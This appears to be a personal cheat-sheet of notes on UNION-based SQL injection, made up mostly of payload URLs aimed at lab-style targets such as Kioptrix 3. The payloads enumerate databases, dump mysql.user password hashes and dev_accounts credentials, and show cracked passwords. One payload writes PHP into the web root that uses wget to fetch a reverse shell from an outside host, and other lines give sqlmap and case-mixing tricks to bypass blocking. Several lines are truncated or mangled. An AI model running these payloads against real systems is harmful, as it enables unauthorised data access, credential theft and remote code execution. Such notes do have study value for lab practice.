# **Error based SQL**

We get the output of the first select statement, but not the second. A possible reason is that the application only prints one entry at a time. So let’s modify our query to give the first select statement a cod value that doesn’t exist so that it prints out the result from the second statement.  
{*******Impotant***** read it before proceeding- → if working with id =1 union but error not showing..use invaild id so that union command can run like cod=-9999}  
---------------------------------------------------------------------------------------------------------------  
?cod=9999 union select 1,@@version,3,4,5,6,7  
  
9999 union select 1,(select '<?php exec(\"wget -O /var/www/html/shell.php ['),3,4,5,6,7">http://](http://10.10.14.12:5555/php-reverse-shell.php/)x.x.x.x  
  
or also can gather password of mysql  
  
Now we know it’s using MariaDB version x.x.x.x  
  
union select 1,(SELECT host, user, password FROM mysql.user),3,4,5,6,7  
  
We get nothing because we’re querying more than one column in the sub select query. Let’s verify that by just outputting the password column.  
  
union select 1,(SELECT password FROM mysql.user),3,4,5,6,7  
  
We get a hash! In order to output multiple columns, you can use the group_concat() function.  
  
union select 1,(SELECT group_concat(host,user,password) FROM mysql.user),3,4,5,6,7  
  
It worked! Now we know that the database is running on localhost, the user is DBadmin and the hash is 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0. We can crack the hash quickly using crackstation.net.  
----------------------------------------------------------------------------------------------------------http://<target ip>/comment.php?id=771%20%20union%20select%201,2,3,4,table_name,6+from%20information_schema.tables {list all databses tables ;)}  
http://<target ip>/comment.php?id=771%20%20union%20select%201,2,3,4,column_name,6+from%20information_schema.columns where table_name='users' {list all databses column of this table;)}  
  
http://<target ip>/comment.php?id=771%20%20union%20select%201,2,3,name,password,6+from users  
======================================================================  
  
http://<target ip>/comment.php?id=771%20%20union%20select%201,2,3,4,gRoUp_cOncaT(0x0a,schema_name,0x0a),6+fRoM+information_schema.schemata  
======================================================================  
To bypass blocking:  
./sqlmap.py --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20x.x.x.x  
  
  

### wfuzz -c -z range,1-x.x.x.x  
  
wfuzz -c -z range,1-x.x.x.x  
  
  
wfuzz -c -z range,1-x.x.x.x  
  

[http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,@@version,4,5,6](http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,@@version,4,5,6)

### {5.0.36}  
  

[http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,user(),4,5,6](http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,user(),4,5,6)

### {root@localhost}  
  

[http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,database(),4,5,6](http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,database(),4,5,6)

### {gallary}  
  

[http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,@@datadir,4,5,6](http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,@@datadir,4,5,6)

### {/var/lib/mysql}  
  
kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,group_concat(table_name),4,5,6 from information_schema.tables where table_schema=database()  
{dev_accounts,gallarific_comments,gallarific_galleries,gallarific_photos,gallarific_settings,gallarific_stats,gallarific_users}  
  
kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,group_concat(column_name),4,5,6 from information_schema.columns where table_name='<table name>'  
{ex

[http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,group_concat(column_name),4,5,6%20from%20information_schema.columns%20where%20table_name=%27dev_accounts%27}](http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,group_concat(column_name),4,5,6%20from%20information_schema.columns%20where%20table_name=%27dev_accounts%27})

###   
{Result- id,username,password}  
  
kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,group_concat(<column name>),4,5,6 from <table name>  
{kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,group_concat(username,0x3a,passwd),4,5,6 from dev_accounts--}  
  
dreg,loneferret  
0d3eccfb887aabd50f243b3f155c0f85 MD5 Mast3r  
5badcaf789d3d1d09794d8f021f40f0e MD5 starwars

  
  
---------------------------------------------------Important******************************888888888  
  
To get all the database of mysql  
  
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata  
http://x.x.x.x